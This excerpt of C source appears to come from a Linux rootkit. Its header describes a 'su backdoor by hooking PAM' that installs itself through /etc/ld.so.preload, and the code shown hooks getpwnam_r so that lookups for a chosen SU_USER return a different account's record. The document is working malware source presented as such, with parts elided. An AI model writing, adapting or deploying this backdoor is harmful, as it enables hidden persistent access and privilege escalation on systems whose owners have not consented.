/*
    ...
    Currently a su backdoor by hooking PAM:
        ...
        [*] Auto-installation: install.sh -> {Makefile, writes backdoor library to /etc/ld.so.preload}.
...
int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result)
{
    ...
    if(strncmp(SU_USER, name, strlen(name)) == 0)
    	return (int) libcalls[GETPWNAM_R](JACK_USER, pwd, buf, buflen, result); // return real_getpwnam_r(JACK_USER, pwd, buf, buflen, result);

    return (int) libcalls[GETPWNAM_R](name, pwd, buf, buflen, result); //return real_getpwnam_r(name, pwd, buf, buflen, result);
}
